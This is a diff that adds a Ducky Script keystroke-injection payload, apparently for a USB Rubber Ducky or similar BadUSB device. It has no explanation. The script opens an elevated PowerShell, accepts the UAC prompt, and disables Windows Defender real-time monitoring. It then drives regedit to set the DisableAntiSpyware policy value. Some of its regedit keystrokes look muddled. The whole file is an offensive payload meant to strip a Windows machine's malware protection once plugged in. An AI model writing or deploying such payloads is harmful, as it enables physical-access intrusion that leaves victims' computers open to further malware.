@@ -1,0 +1,35 @@
+DELAY 2000
+GUI r
+DELAY 200
+STRING "powershell Start-Process PowerShell -Verb RunAs"
+ENTER
+DELAY 5000
+ALT y
+DELAY 2000
+STRING "Set-MpPreference -DisableRealtimeMonitoring $true"
+ENTER
+DELAY 2000
+ALT F4
+DELAY 2000
+GUI r
+DELAY 200
+STRING "regedit"
+ENTER
+DELAY 2000
+ALT y
+DELAY 2000
+GUI d
+DELAY 200
+STRING "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
+ENTER
+DELAY 1000
+ALT e
+DELAY 200
+STRING "DisableAntiSpyware"
+DELAY 200
+ALT d
+DELAY 200
+STRING "1"
+ENTER
+DELAY 200
+ALT F4
